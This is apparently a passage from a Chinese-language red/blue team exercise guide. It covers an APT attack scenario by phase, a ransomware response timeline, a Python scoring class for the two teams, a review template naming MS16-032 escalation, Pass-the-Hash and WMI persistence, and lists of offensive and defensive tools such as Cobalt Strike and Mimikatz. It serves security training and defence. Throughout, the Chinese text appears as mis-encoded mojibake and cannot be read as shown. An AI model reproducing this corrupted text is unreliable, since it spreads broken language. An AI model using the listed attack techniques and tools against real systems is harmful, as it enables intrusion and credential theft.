åœºæ™¯: APTç»„ç»‡é’ˆå¯¹æ€§æ”»å‡»

ç¬¬1å¤© - ä¾¦å¯Ÿé˜¶æ®µ:
â”œâ”€â”€ OSINTä¿¡æ¯æ”¶é›†
â”œâ”€â”€ å­åŸŸåæšä¸¾
â”œâ”€â”€ ç¤¾äº¤åª’ä½“æƒ…æŠ¥
â””â”€â”€ é‚®ç®±åœ°å€æ”¶é›†

ç¬¬2-3å¤© - åˆå§‹è®¿é—®:
â”œâ”€â”€ é’“é±¼é‚®ä»¶å‘é€
â”œâ”€â”€ æ°´å‘æ”»å‡»éƒ¨ç½²
â”œâ”€â”€ VPNæš´åŠ›ç ´è§£
â””â”€â”€ ä¾›åº”é“¾æŠ•æ¯’

ç¬¬4-5å¤© - ç«‹è¶³ç‚¹å»ºç«‹:
â”œâ”€â”€ Webshellä¸Šä¼ 
â”œâ”€â”€ Beaconéƒ¨ç½²
â”œâ”€â”€ æƒé™æå‡
â””â”€â”€ æŒä¹…åŒ–æœºåˆ¶

ç¬¬6-7å¤© - å†…ç½‘æ¸—é€:
â”œâ”€â”€ å‡­è¯è·å–
â”œâ”€â”€ æ¨ªå‘ç§»åŠ¨
â”œâ”€â”€ åŸŸæ§æ¸—é€
â””â”€â”€ æ•°æ®çªƒå–

è¯„åˆ†æ ‡å‡†:
- çº¢é˜ŸæˆåŠŸçªç ´: 10åˆ†/é˜¶æ®µ
- è“é˜ŸæˆåŠŸæ£€æµ‹: -5åˆ†/æ¬¡
- è“é˜ŸæˆåŠŸéåˆ¶: -10åˆ†/æ¬¡
- æœªè¢«å‘ç°å®Œæˆä»»åŠ¡: é¢å¤–20åˆ†
```

**è“é˜Ÿå“åº”åœºæ™¯**:
```
åœºæ™¯: å‹’ç´¢è½¯ä»¶æ”»å‡»å“åº”

T+0åˆ†é’Ÿ - æ£€æµ‹:
â””â”€â”€ SIEMå‘Šè­¦è§¦å‘ï¼ˆå¼‚å¸¸åŠ å¯†è¡Œä¸ºï¼‰

T+15åˆ†é’Ÿ - åˆæ­¥å“åº”:
â”œâ”€â”€ éš”ç¦»å—æ„ŸæŸ“ä¸»æœº
â”œâ”€â”€ é€šçŸ¥å“åº”å›¢é˜Ÿ
â””â”€â”€ è®°å½•åˆå§‹ä¿¡æ¯

T+1å°æ—¶ - æ·±å…¥åˆ†æ:
â”œâ”€â”€ ç¡®å®šæ„ŸæŸ“èŒƒå›´
â”œâ”€â”€ è¯†åˆ«åˆå§‹å…¥ä¾µç‚¹
â”œâ”€â”€ æå–æ¶æ„æ ·æœ¬
â””â”€â”€ é˜»æ–­C2é€šä¿¡

T+4å°æ—¶ - éåˆ¶æ ¹é™¤:
â”œâ”€â”€ éš”ç¦»æ‰€æœ‰å—å½±å“ç³»ç»Ÿ
â”œâ”€â”€ é‡ç½®è¢«ç›—å‡­è¯
â”œâ”€â”€ ä¿®è¡¥æ¼æ´
â””â”€â”€ æ¸…ç†æ¶æ„è½¯ä»¶

T+24å°æ—¶ - æ¢å¤:
â”œâ”€â”€ ä»å¤‡ä»½æ¢å¤æ•°æ®
â”œâ”€â”€ é‡å»ºå—æ„ŸæŸ“ç³»ç»Ÿ
â””â”€â”€ éªŒè¯å®Œæ•´æ€§

T+1å‘¨ - å¤ç›˜:
â”œâ”€â”€ ç¼–å†™äº‹ä»¶æŠ¥å‘Š
â”œâ”€â”€ æ›´æ–°æ£€æµ‹è§„åˆ™
â””â”€â”€ å›¢é˜ŸåŸ¹è®­

è¯„åˆ†æ ‡å‡†:
- 15åˆ†é’Ÿå†…éš”ç¦»: 100åˆ†
- 1å°æ—¶å†…ç¡®å®šèŒƒå›´: 80åˆ†
- 4å°æ—¶å†…éåˆ¶å¨èƒ: 60åˆ†
- 24å°æ—¶å†…æ¢å¤ä¸šåŠ¡: 40åˆ†
```

### 5.3 æ•ˆæœè¯„ä¼°

**è¯„ä¼°æŒ‡æ ‡ä½“ç³»**:
```python
class RedBlueMetrics:
    def __init__(self):
        self.metrics = {
            'red_team': {
                'ttc': 0,  # Time to Compromise (çªç ´æ—¶é—´)
                'ttp': 0,  # Time to Privilege (ææƒæ—¶é—´)
                'ttd': 0,  # Time to Domain (åŸŸæ§æ—¶é—´)
                'detection_rate': 0,  # è¢«æ£€æµ‹ç‡
                'techniques_used': [],  # ä½¿ç”¨çš„æŠ€æœ¯
                'success_rate': 0  # æˆåŠŸç‡
            },
            'blue_team': {
                'ttd': 0,  # Time to Detect (æ£€æµ‹æ—¶é—´)
                'ttr': 0,  # Time to Respond (å“åº”æ—¶é—´)
                'ttc': 0,  # Time to Contain (éåˆ¶æ—¶é—´)
                'tte': 0,  # Time to Eradicate (æ ¹é™¤æ—¶é—´)
                'false_positive_rate': 0,  # è¯¯æŠ¥ç‡
                'coverage': 0  # è¦†ç›–ç‡
            }
        }

    def calculate_red_team_score(self):
        """
        è®¡ç®—çº¢é˜Ÿå¾—åˆ†
        """
        score = 0

        # çªç ´é€Ÿåº¦å¾—åˆ†ï¼ˆè¶Šå¿«è¶Šé«˜ï¼‰
        if self.metrics['red_team']['ttc'] < 3600:  # 1å°æ—¶
            score += 50
        elif self.metrics['red_team']['ttc'] < 86400:  # 1å¤©
            score += 30
        else:
            score += 10

        # éšè”½æ€§å¾—åˆ†
        detection_penalty = self.metrics['red_team']['detection_rate'] * 10
        score -= detection_penalty

        # æŠ€æœ¯å¤šæ ·æ€§å¾—åˆ†
        techniques_bonus = len(self.metrics['red_team']['techniques_used']) * 2
        score += techniques_bonus

        return max(0, score)

    def calculate_blue_team_score(self):
        """
        è®¡ç®—è“é˜Ÿå¾—åˆ†
        """
        score = 0

        # æ£€æµ‹é€Ÿåº¦å¾—åˆ†
        if self.metrics['blue_team']['ttd'] < 300:  # 5åˆ†é’Ÿ
            score += 50
        elif self.metrics['blue_team']['ttd'] < 1800:  # 30åˆ†é’Ÿ
            score += 30
        else:
            score += 10

        # å“åº”æ•ˆç‡å¾—åˆ†
        total_response_time = (
            self.metrics['blue_team']['ttr'] +
            self.metrics['blue_team']['ttc'] +
            self.metrics['blue_team']['tte']
        )

        if total_response_time < 3600:  # 1å°æ—¶
            score += 40
        elif total_response_time < 14400:  # 4å°æ—¶
            score += 20

        # å‡†ç¡®æ€§å¾—åˆ†
        accuracy_bonus = (1 - self.metrics['blue_team']['false_positive_rate']) * 30
        score += accuracy_bonus

        return score

    def generate_report(self):
        """
        ç”Ÿæˆè¯„ä¼°æŠ¥å‘Š
        """
        red_score = self.calculate_red_team_score()
        blue_score = self.calculate_blue_team_score()

        report = f"""
# çº¢è“å¯¹æŠ—æ¼”ç»ƒè¯„ä¼°æŠ¥å‘Š

## çº¢é˜Ÿè¡¨ç°
- ç»¼åˆå¾—åˆ†: {red_score}/100
- çªç ´ç”¨æ—¶: {self.metrics['red_team']['ttc']}ç§’
- ææƒç”¨æ—¶: {self.metrics['red_team']['ttp']}ç§’
- è¢«æ£€æµ‹ç‡: {self.metrics['red_team']['detection_rate']*100}%
- ä½¿ç”¨æŠ€æœ¯: {len(self.metrics['red_team']['techniques_used'])}ç§

## è“é˜Ÿè¡¨ç°
- ç»¼åˆå¾—åˆ†: {blue_score}/100
- å¹³å‡æ£€æµ‹æ—¶é—´: {self.metrics['blue_team']['ttd']}ç§’
- å¹³å‡å“åº”æ—¶é—´: {self.metrics['blue_team']['ttr']}ç§’
- å¹³å‡éåˆ¶æ—¶é—´: {self.metrics['blue_team']['ttc']}ç§’
- è¯¯æŠ¥ç‡: {self.metrics['blue_team']['false_positive_rate']*100}%

## å¯¹æŠ—ç»“æœ
{"çº¢é˜Ÿè·èƒœ" if red_score > blue_score else "è“é˜Ÿè·èƒœ"}
        """

        return report
```

### 5.4 å¤ç›˜æ€»ç»“

**å¤ç›˜æ¡†æ¶**:
```markdown
# çº¢è“å¯¹æŠ—æ¼”ç»ƒå¤ç›˜æŠ¥å‘Š

## 1. æ‰§è¡Œæ‘˜è¦
- æ¼”ç»ƒæ—¶é—´: 2024å¹´XæœˆXæ—¥ - XæœˆXæ—¥
- å‚æ¼”äººå‘˜: çº¢é˜Ÿ5äººï¼Œè“é˜Ÿ8äººï¼Œç™½é˜Ÿ2äºº
- æ¼”ç»ƒèŒƒå›´: XXç³»ç»Ÿã€XXç½‘ç»œ
- ä¸»è¦å‘ç°: Xä¸ªé«˜å±æ¼æ´ï¼ŒXä¸ªä¸­å±æ¼æ´

## 2. çº¢é˜Ÿæˆ˜æœ¯åˆ†æ

### 2.1 æˆåŠŸæˆ˜æœ¯
- âœ… é’“é±¼é‚®ä»¶æˆåŠŸç‡: 30% (å‘é€100å°ï¼ŒæˆåŠŸ30æ¬¡)
- âœ… æƒé™æå‡: åˆ©ç”¨MS16-032æˆåŠŸæå‡è‡³SYSTEM
- âœ… æ¨ªå‘ç§»åŠ¨: Pass-the-Hashæ”»å‡»æˆåŠŸç§»åŠ¨åˆ°5å°ä¸»æœº
- âœ… æŒä¹…åŒ–: WMIäº‹ä»¶è®¢é˜…æŒä¹…åŒ–æœªè¢«å‘ç°

### 2.2 å¤±è´¥æˆ˜æœ¯
- âŒ Mimikatzæ‰§è¡Œè¢«EDRæ‹¦æˆª
- âŒ ç«¯å£æ‰«æè§¦å‘IDSå‘Šè­¦
- âŒ C2é€šä¿¡è¢«é˜²ç«å¢™é˜»æ–­

### 2.3 æ”»å‡»æ—¶é—´çº¿
```
Day 1:
09:00 - å¼€å§‹OSINTæ”¶é›†
14:00 - å‘ç°å­åŸŸåtakeoveræ¼æ´
18:00 - æˆåŠŸè·å¾—åˆå§‹è®¿é—®

Day 2:
10:00 - éƒ¨ç½²Cobalt Strike Beacon
12:00 - æƒé™æå‡è‡³SYSTEM
15:00 - æå–æœ¬åœ°å‡­è¯
18:00 - æ¨ªå‘ç§»åŠ¨åˆ°è·³æ¿æœº

Day 3:
09:00 - ç»§ç»­æ¨ªå‘ç§»åŠ¨
14:00 - æ¥è¿‘åŸŸæ§åˆ¶å™¨
16:00 - è¢«è“é˜Ÿå‘ç°å¹¶éåˆ¶
```

## 3. è“é˜Ÿé˜²å¾¡åˆ†æ

### 3.1 æ£€æµ‹æˆåŠŸæ¡ˆä¾‹
- âœ… SIEMæ£€æµ‹åˆ°å¼‚å¸¸PowerShellæ´»åŠ¨ï¼ˆT+2å°æ—¶ï¼‰
- âœ… EDRæ‹¦æˆªMimikatzæ‰§è¡Œï¼ˆT+1å¤©ï¼‰
- âœ… ç½‘ç»œç›‘æ§å‘ç°å¼‚å¸¸å¤–è”ï¼ˆT+2å¤©ï¼‰

### 3.2 æ£€æµ‹å¤±è´¥æ¡ˆä¾‹
- âŒ é’“é±¼é‚®ä»¶æœªè¢«è¯†åˆ«
- âŒ WMIæŒä¹…åŒ–æœªè¢«æ£€æµ‹
- âŒ é¦–æ¬¡æ¨ªå‘ç§»åŠ¨æœªå‘Šè­¦

### 3.3 å“åº”æ—¶é—´çº¿
```
T+2å°æ—¶: é¦–æ¬¡å‘Šè­¦ï¼ˆPowerShellå¼‚å¸¸ï¼‰
T+2å°æ—¶15åˆ†: å®‰å…¨åˆ†æå¸ˆå¼€å§‹è°ƒæŸ¥
T+3å°æ—¶: ç¡®è®¤ä¸ºçº¢é˜Ÿæ´»åŠ¨
T+4å°æ—¶: å¼€å§‹éåˆ¶æªæ–½
T+1å¤©: å®Œå…¨éåˆ¶å¨èƒ
```

## 4. å‘ç°çš„å®‰å…¨é—®é¢˜

### 4.1 é«˜å±é—®é¢˜
1. **æœªä¿®è¡¥çš„ç³»ç»Ÿæ¼æ´** (ä¸¥é‡)
   - å½±å“: 10å°æœåŠ¡å™¨å­˜åœ¨MS16-032æ¼æ´
   - å»ºè®®: ç«‹å³å®‰è£…å®‰å…¨è¡¥ä¸
   - è´£ä»»äºº: ç³»ç»Ÿç®¡ç†å‘˜
   - ä¿®å¤æœŸé™: 1å‘¨å†…

2. **å¼±å¯†ç ç­–ç•¥** (é«˜å±)
   - å½±å“: 30%è´¦æˆ·ä½¿ç”¨å¼±å¯†ç 
   - å»ºè®®: å¼ºåˆ¶å¤æ‚å¯†ç ç­–ç•¥
   - è´£ä»»äºº: ADç®¡ç†å‘˜
   - ä¿®å¤æœŸé™: 2å‘¨å†…

### 4.2 ä¸­å±é—®é¢˜
1. **ç¼ºå°‘å¤šå› ç´ è®¤è¯**
   - å½±å“: VPNå’Œç®¡ç†åå°æœªå¯ç”¨MFA
   - å»ºè®®: éƒ¨ç½²MFAè§£å†³æ–¹æ¡ˆ
   - è´£ä»»äºº: å®‰å…¨å›¢é˜Ÿ
   - ä¿®å¤æœŸé™: 1ä¸ªæœˆ

2. **æ—¥å¿—ç•™å­˜ä¸è¶³**
   - å½±å“: ä»…ä¿ç•™7å¤©æ—¥å¿—
   - å»ºè®®: å»¶é•¿è‡³90å¤©
   - è´£ä»»äºº: è¿ç»´å›¢é˜Ÿ
   - ä¿®å¤æœŸé™: 2å‘¨å†…

## 5. æ”¹è¿›å»ºè®®

### 5.1 æŠ€æœ¯å±‚é¢
- [ ] éƒ¨ç½²EDRåˆ°æ‰€æœ‰ç»ˆç«¯
- [ ] æ›´æ–°SIEMæ£€æµ‹è§„åˆ™
- [ ] å®æ–½ç½‘ç»œåˆ†æ®µ
- [ ] å¯ç”¨LSAä¿æŠ¤
- [ ] éƒ¨ç½²æ¬ºéª—æŠ€æœ¯ï¼ˆHoneypotï¼‰

### 5.2 æµç¨‹å±‚é¢
- [ ] å»ºç«‹åº”æ€¥å“åº”æ‰‹å†Œ
- [ ] å®šæœŸå®‰å…¨åŸ¹è®­
- [ ] æ¼æ´ç®¡ç†æµç¨‹
- [ ] å˜æ›´ç®¡ç†åŠ å›º

### 5.3 äººå‘˜å±‚é¢
- [ ] å¢åŠ å®‰å…¨åˆ†æå¸ˆ
- [ ] å¨èƒç‹©çŒåŸ¹è®­
- [ ] çº¢è“å¯¹æŠ—å®šæœŸåŒ–

## 6. ä¸‹æ¬¡æ¼”ç»ƒè®¡åˆ’
- æ—¶é—´: 3ä¸ªæœˆå
- é‡ç‚¹: éªŒè¯æ”¹è¿›æªæ–½æœ‰æ•ˆæ€§
- æ–°å¢åœºæ™¯: ä¾›åº”é“¾æ”»å‡»æ¨¡æ‹Ÿ
```

---

## æ¨¡å—å…­ï¼šå·¥å…·å¹³å°ä¸è‡ªåŠ¨åŒ–

### æ¨¡å—æ€»è§ˆï¼ˆå·¥å…·è§†è§’ï¼‰
- **ç›®æ ‡**ï¼šæ­å»ºçº¢è“å¯¹æŠ—å…¨é“¾è·¯å·¥å…·ç”Ÿæ€ï¼Œè¦†ç›–æƒ…æŠ¥æ”¶é›†ã€æ”»å‡»æ‰§è¡Œã€æ£€æµ‹å“åº”ã€å–è¯å¤ç›˜ä¸è‡ªåŠ¨åŒ–ç¼–æ’ã€‚
- **ç­–ç•¥**ï¼šå¼€æº + å•†ä¸š + è‡ªç ”ç»„åˆï¼Œéµå¾ªâ€œå®‰å…¨ã€å¯æ§ã€å¯å®¡è®¡â€åŸåˆ™ï¼Œç¡®ä¿å·¥å…·ä½¿ç”¨åˆè§„å¹¶å½¢æˆèµ„äº§ç®¡ç†ã€‚
- **è¾“å‡º**ï¼š
  - å·¥å…·èƒ½åŠ›çŸ©é˜µï¼ˆåŠŸèƒ½ã€æˆæœ¬ã€é€‚ç”¨åœºæ™¯ã€é£é™©ï¼‰
  - è‡ªåŠ¨åŒ–æµæ°´çº¿è®¾è®¡ï¼ˆCI/CDã€SOARã€IaCï¼‰
  - å·¥å…·ç®¡ç†åˆ¶åº¦ï¼ˆè¯„ä¼°ã€å¼•å…¥ã€å‡çº§ã€é€€å½¹ï¼‰

#### å·¥å…·æ²»ç†æµç¨‹
1. **éœ€æ±‚è¯„ä¼°**ï¼šè¯†åˆ«å·¥å…·ç”¨é€”ã€é€‚é…åœºæ™¯ã€æ›¿ä»£æ–¹æ¡ˆã€‚
2. **é£é™©è¯„ä¼°**ï¼šæ£€æŸ¥æˆæƒåè®®ã€ä¾›åº”é“¾å®‰å…¨ã€åŠŸèƒ½é™åˆ¶ã€‚
3. **å¼•å…¥æµ‹è¯•**ï¼šåœ¨éš”ç¦»ç¯å¢ƒæµ‹è¯•åŠŸèƒ½ã€å…¼å®¹æ€§ã€æ—¥å¿—è¾“å‡ºã€‚
4. **ä¸Šçº¿ç™»è®°**ï¼šçº³å…¥CMDBæˆ–å·¥å…·å°è´¦ï¼Œå®šä¹‰è´Ÿè´£äººä¸ç»´æŠ¤å‘¨æœŸã€‚
5. **ä½¿ç”¨ç›‘æ§**ï¼šè®°å½•ä½¿ç”¨æ—¥å¿—ã€æ•°æ®æµå‘ã€æ•æ„Ÿæ“ä½œå®¡æ‰¹ï¼›å…³é”®å·¥å…·å¯ç”¨å¤šå› ç´ è®¤è¯ã€‚
6. **å®šæœŸå¤æ ¸**ï¼šåŠå¹´ä¸€æ¬¡å®‰å…¨è¯„ä¼°ï¼Œç¡®å®šæ˜¯å¦å‡çº§æˆ–é€€å½¹ã€‚

### 6.1 çº¢é˜Ÿå·¥å…·ç®±

**C2æ¡†æ¶å¯¹æ¯”**:
```
æ¡†æ¶          | ä¼˜åŠ¿                    | åŠ£åŠ¿
-------------|------------------------|------------------
Cobalt Strike | æˆç†Ÿç¨³å®šã€åŠŸèƒ½å¼ºå¤§        | å•†ä¸šè½¯ä»¶ã€ç‰¹å¾æ˜æ˜¾
Metasploit   | å…è´¹å¼€æºã€æ¨¡å—ä¸°å¯Œ        | æµé‡ç‰¹å¾æ˜æ˜¾
Empire       | PowerShellåŸç”Ÿã€éšè”½æ€§å¥½  | å·²åœæ­¢ç»´æŠ¤
Covenant     | .NETåŸç”Ÿã€çµæ´»æ€§å¼º        | ç¤¾åŒºè¾ƒå°
Sliver       | ç°ä»£åŒ–ã€éšè”½æ€§å¥½          | ç›¸å¯¹è¾ƒæ–°
```

**æ¨èå·¥å…·ç»„åˆ**:
```bash
# ä¿¡æ¯æ”¶é›†
- Amass: å­åŸŸåæšä¸¾
- theHarvester: OSINTæ”¶é›†
- Shodan CLI: äº’è”ç½‘èµ„äº§æœç´¢

# æ¼æ´æ‰«æ
- Nmap: ç«¯å£æœåŠ¡æ‰«æ
- Nuclei: æ¼æ´æ¨¡æ¿æ‰«æ
- Nessus: ç»¼åˆæ¼æ´æ‰«æ

# æ¼æ´åˆ©ç”¨
- Metasploit: ç»¼åˆæ¸—é€æ¡†æ¶
- Impacket: åè®®å·¥å…·é›†
- CrackMapExec: å†…ç½‘æ¸—é€

# åæ¸—é€
- Mimikatz: å‡­è¯æå–
- BloodHound: ADåˆ†æ
- Empire: PowerShellåæ¸—é€

# C2é€šä¿¡
- Cobalt Strike: ä¼ä¸šçº§C2
- Sliver: ç°ä»£åŒ–C2
- Mythic: æ¨¡å—åŒ–C2
```

### å¯¹æŠ—è‡ªåŠ¨åŒ–æµæ°´çº¿ç¤ºä¾‹
```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”     â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”     â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”     â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ Git ä»“åº“     â”‚ --> â”‚ CI/CD å¹³å°    â”‚ --> â”‚ ç›®æ ‡ç¯å¢ƒ/é¶åœº   â”‚ --> â”‚ SOAR/å‘Šè­¦å¹³å° â”‚
â”‚ (è„šæœ¬/è§„åˆ™) â”‚     â”‚ (GitLab CI) â”‚     â”‚  (IaCéƒ¨ç½²)     â”‚     â”‚  (Cortex/XSOAR)â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜     â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜     â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜     â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
        â”‚                    â”‚                    â”‚                    â”‚
        â–¼                    â–¼                    â–¼                    â–¼
  ä»£ç è¯„å®¡(PR)      è‡ªåŠ¨æµ‹è¯•/éªŒè¯        è‡ªåŠ¨æ‰§è¡Œæ”»å‡»åœºæ™¯       è‡ªåŠ¨åˆ›å»ºå“åº”å·¥å•
```

**é˜¶æ®µè¯´æ˜**ï¼š
1. **è„šæœ¬/è§„åˆ™ä»“åº“**ï¼šç»Ÿä¸€ç®¡ç†çº¢é˜Ÿæ”»å‡»è„šæœ¬ã€è“é˜Ÿæ£€æµ‹è§„åˆ™ã€SOAR Playbookã€‚æäº¤å‰é¡»é€šè¿‡ä»£ç è§„èŒƒä¸å®‰å…¨å®¡è®¡ã€‚
2. **CI/CDéªŒè¯**ï¼šè¿è¡Œå•å…ƒæµ‹è¯•ã€é™æ€æ‰«æã€åŸå­åŒ–éªŒè¯ï¼ˆInvoke-Atomicï¼‰ã€æ¨¡æ‹Ÿæ•°æ®æµ‹è¯•Sigmaè§„åˆ™ï¼Œè‡ªåŠ¨ç”ŸæˆæŠ¥å‘Šã€‚
3. **é¶åœºéƒ¨ç½²**ï¼šé€šè¿‡Terraform/Ansibleè‡ªåŠ¨åˆ›å»ºæ¼”ç»ƒç¯å¢ƒã€éƒ¨ç½²C2ã€æ¨¡æ‹Ÿèµ„äº§ã€æ—¥å¿—ç®¡é“ã€‚
4. **SOARè”åŠ¨**ï¼šå½“è§„åˆ™è§¦å‘æ—¶è‡ªåŠ¨ç”Ÿæˆå·¥å•ã€æ‰§è¡Œéš”ç¦»è„šæœ¬ã€è§¦å‘å–è¯é‡‡é›†ï¼Œå¹¶åŒæ­¥æ”»é˜²çœ‹æ¿ã€‚
5. **å½’æ¡£ä¸é”€æ¯**ï¼šæ¼”ç»ƒç»“æŸåè‡ªåŠ¨å¯¼å‡ºæ—¥å¿—ã€è¯æ®ï¼Œé”€æ¯ä¸´æ—¶åŸºç¡€è®¾æ–½ï¼Œæ›´æ–°CMDBã€‚

### 6.2 è“é˜Ÿå·¥å…·ç®±

**SIEMå¹³å°å¯¹æ¯”**:
```
å¹³å°         | ä¼˜åŠ¿                    | åŠ£åŠ¿
------------|------------------------|------------------
Splunk      | åŠŸèƒ½å¼ºå¤§ã€ç”Ÿæ€ä¸°å¯Œ        | ä»·æ ¼æ˜‚è´µ
ELK Stack   | å…è´¹å¼€æºã€å¯å®šåˆ¶æ€§å¼º      | éœ€è¦ç»´æŠ¤
QRadar      | IBMæ”¯æŒã€é›†æˆåº¦é«˜        | ä»·æ ¼é«˜ã€å¤æ‚
ArcSight    | æˆç†Ÿç¨³å®š                | å­¦ä¹ æ›²çº¿é™¡å³­
```

**æ¨èå·¥å…·ç»„åˆ**:
```bash
# æ—¥å¿—æ”¶é›†
- Sysmon: Windowsç³»ç»Ÿç›‘æ§
- Auditd: Linuxå®¡è®¡
- Osquery: è·¨å¹³å°æŸ¥è¯¢
- Beats: è½»é‡çº§é‡‡é›†å™¨

# å¨èƒæ£€æµ‹
- Zeek: ç½‘ç»œæµé‡åˆ†æ
- Suricata: IDS/IPS
- YARA: æ¶æ„è½¯ä»¶æ£€æµ‹
- Sigma: æ£€æµ‹è§„åˆ™æ ‡å‡†

# ç«¯ç‚¹é˜²æŠ¤
- Windows Defender ATP
- CrowdStrike Falcon
- Carbon Black
- SentinelOne

# å¨èƒæƒ…æŠ¥
- MISP: å¨èƒæƒ…æŠ¥å¹³å°
- OpenCTI: å¨èƒæƒ…æŠ¥ç®¡ç†
- AlienVault OTX: ç¤¾åŒºæƒ…æŠ¥

# åº”æ€¥å“åº”
- Volatility: å†…å­˜å–è¯
- Autopsy: ç£ç›˜å–è¯
- Wireshark: æµé‡åˆ†æ
- KAPE: å¿«é€Ÿå–è¯
```

---

## æ¨¡å—ä¸ƒï¼šå­¦ä¹ éªŒè¯ä¸èƒ½åŠ›åº¦é‡

### æ¨¡å—æ€»è§ˆï¼ˆåº¦é‡è§†è§’ï¼‰
- **ç›®çš„**ï¼šæ„å»ºè¦†ç›–ä¸ªäººã€å›¢é˜Ÿã€ç»„ç»‡å±‚é¢çš„èƒ½åŠ›è¯„ä»·ä½“ç³»ï¼Œç¡®ä¿å­¦ä¹ ä¸æ¼”ç»ƒæˆæœå¯é‡åŒ–ã€å¯è¿½è¸ªã€å¯å¤ç”¨ã€‚
- **è¯„ä¼°ç»´åº¦**ï¼šæŠ€èƒ½ã€æµç¨‹ã€å·¥å…·ã€ååŒã€æˆæœã€å½±å“åŠ›ã€‚
- **è¾“å‡º**ï¼šèƒ½åŠ›é›·è¾¾ã€OKRæŒ‡æ ‡ã€æ¼”ç»ƒKPIã€å­¦ä¹ æ—¥å¿—æ¨¡æ¿ã€ä½œå“é›†æŒ‡å—ã€‚

#### çº¢è“å¯¹æŠ—KPIå‚è€ƒ
| æŒ‡æ ‡ç±»åˆ« | æŒ‡æ ‡åç§° | æè¿° | ç›®æ ‡å€¼ | å¤‡æ³¨ |
| --- | --- | --- | --- | --- |
| æ£€æµ‹æ•ˆç‡ | MTTD (Mean Time To Detect) | ä»æ”»å‡»å‘ç”Ÿåˆ°å‘Šè­¦è§¦å‘çš„å¹³å‡æ—¶é—´ | < 15 åˆ†é’Ÿ | å…³é”®èµ„äº§ <5 åˆ†é’Ÿ |
| å“åº”æ•ˆç‡ | MTTR (Mean Time To Respond) | ä»å‘Šè­¦åˆ°é‡‡å–è¡ŒåŠ¨çš„å¹³å‡æ—¶é—´ | < 30 åˆ†é’Ÿ | é«˜å±å‘Šè­¦ä¼˜å…ˆ |
| æ¼”ç»ƒè¦†ç›– | MITREè¦†ç›–ç‡ | ATT&CKæˆ˜æœ¯è¦†ç›–æ•°é‡ / æ€»æˆ˜æœ¯æ•° | â‰¥ 80% | æ ¸å¿ƒæŠ€æœ¯ â‰¥ 70% |
| æ”¹è¿›é—­ç¯ | è¡ŒåŠ¨é¡¹å…³é—­ç‡ | 30å¤©å†…å®Œæˆçš„æ”¹è¿›é¡¹ / æ€»æ•° | â‰¥ 85% | ç™½é˜Ÿè´Ÿè´£è·Ÿè¸ª |
| å­¦ä¹ æ²‰æ·€ | çŸ¥è¯†è¾“å‡ºé¢‘ç‡ | åšå®¢/åˆ†äº«/å·¥å…·æ›´æ–°æ¬¡æ•° | â‰¥ 2æ¬¡/æœˆ | å›¢é˜Ÿå…±å»º |

#### ä¸ªäººæˆé•¿OKRç¤ºä¾‹
- **Objective**ï¼šæˆä¸ºèƒ½å¤Ÿç‹¬ç«‹ä¸»æŒçº¢è“å¯¹æŠ—æ¼”ç»ƒçš„ä¸“å®¶ã€‚
  - KR1ï¼šå®Œæˆä¸å°‘äº3æ¬¡çº¢é˜Ÿä¸è“é˜ŸåŒè§’è‰²æ¼”ç»ƒå¹¶äº¤ä»˜æŠ¥å‘Šã€‚
  - KR2ï¼šè¾“å‡º12ç¯‡æ¼”ç»ƒå¤ç›˜æˆ–æŠ€æœ¯æ–‡ç« ï¼Œå¹¶åœ¨ç¤¾åŒºåˆ†äº«â‰¥2æ¬¡ã€‚
  - KR3ï¼šå°†å›¢é˜Ÿæ£€æµ‹è¦†ç›–ç‡æå‡åˆ°80%ï¼Œæ–°å¢â‰¥10æ¡é«˜è´¨é‡æ£€æµ‹è§„åˆ™ã€‚

### âœ… é˜¶æ®µä¸€ï¼šåŸºç¡€ç†è®ºï¼ˆ2å‘¨ï¼‰
- [ ] ç†è§£çº¢è“å¯¹æŠ—æ ¸å¿ƒæ¦‚å¿µ
- [ ] æŒæ¡MITRE ATT&CKæ¡†æ¶
- [ ] äº†è§£å¸¸è§æ”»å‡»æŠ€æœ¯
- [ ] ç†Ÿæ‚‰åŸºç¡€é˜²å¾¡ç­–ç•¥

### âœ… é˜¶æ®µäºŒï¼šçº¢é˜ŸæŠ€èƒ½ï¼ˆ6å‘¨ï¼‰
- [ ] æŒæ¡3ç§ä»¥ä¸Šåˆå§‹è®¿é—®æŠ€æœ¯
- [ ] èƒ½å¤Ÿä½¿ç”¨Cobalt Strike/Metasploit
- [ ] ç†Ÿç»ƒè¿›è¡Œæƒé™æå‡
- [ ] æŒæ¡æ¨ªå‘ç§»åŠ¨æŠ€æœ¯
- [ ] å®Œæˆ10ä¸ªå†…ç½‘é¶æœº

### âœ… é˜¶æ®µä¸‰ï¼šè“é˜ŸæŠ€èƒ½ï¼ˆ6å‘¨ï¼‰
- [ ] éƒ¨ç½²å¹¶é…ç½®SIEMç³»ç»Ÿ
- [ ] ç¼–å†™æ£€æµ‹è§„åˆ™
- [ ] è¿›è¡Œå¨èƒç‹©çŒ
- [ ] æ‰§è¡Œåº”æ€¥å“åº”æµç¨‹
- [ ] å®Œæˆ3æ¬¡å–è¯åˆ†æ

### âœ… é˜¶æ®µå››ï¼šç´«é˜ŸååŒï¼ˆ2å‘¨ï¼‰
- [ ] ä½¿ç”¨Atomic Red Teamæµ‹è¯•
- [ ] éƒ¨ç½²Calderaå¹³å°
- [ ] ä¼˜åŒ–æ£€æµ‹è§„åˆ™
- [ ] å®Œå–„å“åº”æµç¨‹

### âœ… é˜¶æ®µäº”ï¼šå®æˆ˜æ¼”ç»ƒï¼ˆ4å‘¨ï¼‰
- [ ] å‚ä¸å®Œæ•´çº¢è“å¯¹æŠ—æ¼”ç»ƒ
- [ ] ç¼–å†™æ¼”ç»ƒæŠ¥å‘Š
- [ ] å®æ–½æ”¹è¿›æªæ–½
- [ ] é€šè¿‡ç›¸å…³è®¤è¯ï¼ˆGPEN/GCIHï¼‰

### èƒ½åŠ›é›·è¾¾è‡ªè¯„è¡¨
